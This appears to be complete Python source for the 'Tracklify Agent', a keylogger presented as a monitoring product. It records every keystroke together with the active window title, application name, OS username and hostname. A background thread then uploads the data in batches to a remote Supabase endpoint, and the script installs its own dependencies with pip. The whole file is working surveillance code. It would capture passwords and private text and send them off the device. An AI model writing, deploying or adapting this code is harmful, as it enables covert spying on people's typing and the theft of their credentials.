#!/usr/bin/env python3
"""
Tracklify Agent - Keystroke Monitoring Agent
This script captures keystrokes and sends them to the Tracklify backend.
"""

import os
import sys
import json
import time
import uuid
import socket
import platform
import threading
import queue
import requests
from datetime import datetime
from typing import Dict, Any, Optional, List

try:
    from pynput import keyboard
except ImportError:
    print("Installing required packages...")
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput", "requests"])
    from pynput import keyboard

# Configuration
SUPABASE_URL = "https://your-supabase-url.supabase.co"  # Replace with your Supabase URL
SUPABASE_KEY = "your-supabase-anon-key"  # Replace with your Supabase anon key
DEVICE_ID = f"{socket.gethostname()}-{str(uuid.uuid4())[:8]}"
BUFFER_SIZE = 100  # Number of keystrokes to buffer before sending
SYNC_INTERVAL = 10  # Seconds between sync attempts
DEBUG = False  # Set to True for verbose logging

# Global variables
keystroke_buffer = queue.Queue()
last_window_title = ""
last_application = ""
is_running = True
sync_thread = None
device_info = {
    "os": platform.system(),
    "os_version": platform.version(),
    "hostname": socket.gethostname(),
    "username": os.getlogin(),
    "device_id": DEVICE_ID,
}

def get_active_window_info() -> Dict[str, str]:
    """Get the title and application of the active window."""
    window_title = "Unknown"
    application = "Unknown"
    
    try:
        if platform.system() == "Windows":
            import win32gui
            window = win32gui.GetForegroundWindow()
            window_title = win32gui.GetWindowText(window)
            _, pid = win32gui.GetWindowThreadProcessId(window)
            
            import psutil
            try:
                application = psutil.Process(pid).name()
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                application = "Unknown"
                
        elif platform.system() == "Darwin":  # macOS
            try:
                from AppKit import NSWorkspace
                active_app = NSWorkspace.sharedWorkspace().activeApplication()
                application = active_app['NSApplicationName']
                window_title = "Active Window"  # macOS doesn't easily provide window titles
            except ImportError:
                pass
                
        elif platform.system() == "Linux":
            try:
                import subprocess
                window_title = subprocess.check_output(["xdotool", "getactivewindow", "getwindowname"]).decode().strip()
                application = "X11 Application"
            except (ImportError, subprocess.SubprocessError):
                pass
    except Exception as e:
        if DEBUG:
            print(f"Error getting window info: {e}")
    
    return {
        "window_title": window_title,
        "application": application
    }

def on_press(key):
    """Callback function for key press events."""
    global last_window_title, last_application
    
    try:
        # Get the current window info every 10 keystrokes
        if keystroke_buffer.qsize() % 10 == 0:
            window_info = get_active_window_info()
            last_window_title = window_info["window_title"]
            last_application = window_info["application"]
        
        # Format the key
        if hasattr(key, 'char'):
            key_char = key.char if key.char else f"[{key}]"
        else:
            key_char = f"[{key}]"
        
        # Add to buffer
        keystroke_data = {
            "keystroke": key_char,
            "timestamp": datetime.now().isoformat(),
            "window_title": last_window_title,
            "application": last_application,
            "device_id": DEVICE_ID,
        }
        
        keystroke_buffer.put(keystroke_data)
        
        if DEBUG:
            print(f"Key: {key_char} | Window: {last_window_title} | App: {last_application}")
            
    except Exception as e:
        if DEBUG:
            print(f"Error in key press handler: {e}")

def sync_keystrokes():
    """Send buffered keystrokes to the server."""
    global is_running
    
    while is_running:
        try:
            # Wait for the buffer to have some data or timeout
            time.sleep(SYNC_INTERVAL)
            
            # Collect all available keystrokes from the buffer
            keystrokes = []
            while not keystroke_buffer.empty() and len(keystrokes) < BUFFER_SIZE:
                keystrokes.append(keystroke_buffer.get())
            
            if not keystrokes:
                continue
                
            # Prepare the data for sending
            logs_to_send = []
            for ks in keystrokes:
                log_entry = {
                    "keystroke": ks["keystroke"],
                    "device_id": DEVICE_ID,
                    "window_title": ks["window_title"],
                    "application": ks["application"],
                    "metadata": {
                        "timestamp_local": ks["timestamp"],
                        "device_info": device_info
                    }
                }
                logs_to_send.append(log_entry)
            
            # Send to Supabase
            headers = {
                "apikey": SUPABASE_KEY,
                "Content-Type": "application/json",
                "Prefer": "return=minimal"
            }
            
            response = requests.post(
                f"{SUPABASE_URL}/rest/v1/agent_logs",
                headers=headers,
                json=logs_to_send
            )
            
            if response.status_code in (200, 201, 204):
                if DEBUG:
                    print(f"Successfully sent {len(keystrokes)} keystrokes")
            else:
                if DEBUG:
                    print(f"Error sending keystrokes: {response.status_code} - {response.text}")
                # Put the keystrokes back in the buffer
                for ks in keystrokes:
                    keystroke_buffer.put(ks)
                    
        except requests.RequestException as e:
            if DEBUG:
                print(f"Network error: {e}")
            # Put the keystrokes back in the buffer
            for ks in keystrokes:
                keystroke_buffer.put(ks)
                
        except Exception as e:
            if DEBUG:
                print(f"Error in sync thread: {e}")

def start_agent():
    """Start the keystroke monitoring agent."""
    global sync_thread, is_running
    
    print(f"Starting Tracklify Agent on {DEVICE_ID}")
    print(f"OS: {device_info['os']} {device_info['os_version']}")
    print(f"User: {device_info['username']}")
    print("Press Ctrl+C to stop")
    
    # Start the sync thread
    is_running = True
    sync_thread = threading.Thread(target=sync_keystrokes)
    sync_thread.daemon = True
    sync_thread.start()
    
    # Start the keyboard listener
    with keyboard.Listener(on_press=on_press) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            print("Stopping Tracklify Agent...")
            is_running = False
            if sync_thread:
                sync_thread.join(timeout=2)
            print("Agent stopped")

if __name__ == "__main__":
    start_agent()
